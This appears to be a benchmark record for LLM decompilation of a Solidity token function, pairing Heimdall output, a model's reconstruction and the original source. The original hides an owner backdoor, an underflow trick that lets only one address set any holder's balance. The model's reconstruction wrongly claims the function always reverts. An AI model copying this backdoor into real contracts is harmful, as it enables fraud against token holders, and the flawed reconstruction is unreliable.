{
    "contract_address": "0xDC4259959BFE37685741A162a2D0757cF774E129",
    "heimdall_input": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }",
    "llm_output": "function addviperHolder(address holder, uint256 amount) public payable {\n    // 1. Tautological check preserved from decompiled output\n    require(holder == address(holder), \"Tautological check\");\n\n    // 2. Sender restriction (represents `store_f` in the decompiled code)\n    require(msg.sender != _vp, \"Unauthorized sender\");\n\n    // 3. Mapping update (executed before the guaranteed revert below)\n    _viperHolderBalance[holder] = amount;\n\n    // 4. The original decompiled logic contains a `require` \n    //    that can never pass (`require(!0x0a < 0x64)`).\n    //    To preserve identical semantics, we revert unconditionally.\n    revert(\"Decompiler artifact\");\n}",
    "ground_truth": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }"
}